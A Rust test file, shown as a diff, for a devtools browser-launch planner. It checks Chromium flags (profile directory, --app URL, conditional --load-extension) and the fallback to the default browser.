+use super::test_support::*;
+use crate::devtools_browser::{BrowserTarget, Launch};
+
+const PANEL: &str = "http://localhost:5174";
+
+/// (Some(program, args)) for a Chromium launch, or (None, url, notice) for the default browser.
+fn plan(
+    target: BrowserTarget,
+    on_path: &[&str],
+    extension: Option<&Path>,
+) -> (
+    Option<(PathBuf, Vec<String>)>,
+    Option<(String, Option<String>)>,
+) {
+    let on_path: Vec<String> = on_path.iter().map(|s| s.to_string()).collect();
+    let lookup = move |name: &str| {
+        on_path
+            .iter()
+            .any(|p| p == name)
+            .then(|| PathBuf::from(format!("/usr/bin/{name}")))
+    };
+    let url = format!("{PANEL}#thread=t-1");
+    match crate::devtools_browser::plan(target, &url, Path::new("/data/zeo"), extension, &lookup) {
+        Launch::Chromium { program, args } => (Some((program, args)), None),
+        Launch::Default { url, notice } => (None, Some((url, notice))),
+    }
+}
+
+#[test]
+fn isolated_chromium_gets_the_profile_no_first_run_and_the_app_url() {
+    let (chromium, _) = plan(BrowserTarget::Isolated, &["chromium"], None);
+    let (program, args) = chromium.expect("R4.3: Chromium");
+    assert_eq!(program, PathBuf::from("/usr/bin/chromium"));
+    assert!(
+        args.contains(&"--user-data-dir=/data/zeo/browser-profile".to_string()),
+        "{args:?}"
+    );
+    assert!(args.contains(&"--no-first-run".to_string()), "{args:?}");
+    assert!(
+        args.contains(&format!("--app={PANEL}#thread=t-1")),
+        "G10: the fragment is kept: {args:?}"
+    );
+}
+
+#[test]
+fn hostile_load_extension_only_for_a_directory_holding_a_manifest() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let empty = dir.path().join("empty");
+    std::fs::create_dir(&empty).expect("mkdir");
+    let real = dir.path().join("ext");
+    std::fs::create_dir(&real).expect("mkdir");
+    std::fs::write(real.join("manifest.json"), "{}").expect("write");
+
+    let missing = dir.path().join("missing");
+    for extension in [None, Some(empty.as_path()), Some(missing.as_path())] {
+        let (chromium, _) = plan(BrowserTarget::Isolated, &["chromium"], extension);
+        let (_, args) = chromium.expect("Chromium");
+        assert!(
+            !args.iter().any(|a| a.starts_with("--load-extension")),
+            "{extension:?}: {args:?}"
+        );
+    }
+    let (chromium, _) = plan(BrowserTarget::Isolated, &["chromium"], Some(real.as_path()));
+    let (_, args) = chromium.expect("Chromium");
+    assert!(
+        args.contains(&format!("--load-extension={}", real.display())),
+        "R4.3: {args:?}"
+    );
+}
+
+#[test]
+fn hostile_chromium_browser_counts_and_neither_falls_back_with_the_notice() {
+    let (chromium, _) = plan(BrowserTarget::Isolated, &["chromium-browser"], None);
+    assert_eq!(
+        chromium.map(|c| c.0),
+        Some(PathBuf::from("/usr/bin/chromium-browser"))
+    );
+    let (chromium, default) = plan(BrowserTarget::Isolated, &["google-chrome"], None);
+    assert!(
+        chromium.is_none(),
+        "Google Chrome ignores --load-extension (G10): not used"
+    );
+    let (url, notice) = default.expect("R4.4: the default browser");
+    assert_eq!(url, format!("{PANEL}#thread=t-1"));
+    assert_eq!(
+        notice.as_deref(),
+        Some("Chromium not found: opened in your default browser")
+    );
+}
+
+#[test]
+fn the_system_target_opens_the_default_browser_silently() {
+    let (chromium, default) = plan(BrowserTarget::System, &["chromium"], None);
+    assert!(chromium.is_none(), "R4.5: even with Chromium on PATH");
+    assert_eq!(default, Some((format!("{PANEL}#thread=t-1"), None)));
+}
